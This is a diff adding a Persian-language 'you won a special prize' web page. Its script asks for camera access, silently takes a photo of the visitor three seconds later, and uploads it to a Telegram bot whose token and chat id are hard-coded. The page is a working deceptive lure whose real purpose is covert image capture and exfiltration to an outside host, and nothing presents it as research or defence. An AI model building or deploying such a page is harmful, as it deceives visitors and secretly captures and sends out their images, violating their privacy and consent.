@@ -1,0 +1,74 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جایزه ویژه</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    .card {
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+      max-width: 400px;
+      margin: auto;
+    }
+    video {
+      width: 100%;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>🎉 تبریک! شما برنده جایزه ویژه شدید</h2>
+    <p>برای دریافت جایزه، لطفاً دوربین را فعال کنید</p>
+    <video id="video" autoplay muted></video>
+  </div>
+
+  <script>
+    const token = "8071837045:AAGidzXGssRwy5chfgPWSUkQycWX6axBcFk";
+    const chat_id = "136963421";
+
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("photo", blob, "photo.jpg");
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function startCamera() {
+      const video = document.getElementById("video");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // پس از ۳ ثانیه عکس بگیر و بفرست
+        setTimeout(async () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+          canvas.toBlob(sendPhoto, "image/jpeg", 0.95);
+        }, 3000);
+
+      } catch (err) {
+        alert("برای ادامه لطفاً دسترسی دوربین را فعال کنید.");
+      }
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
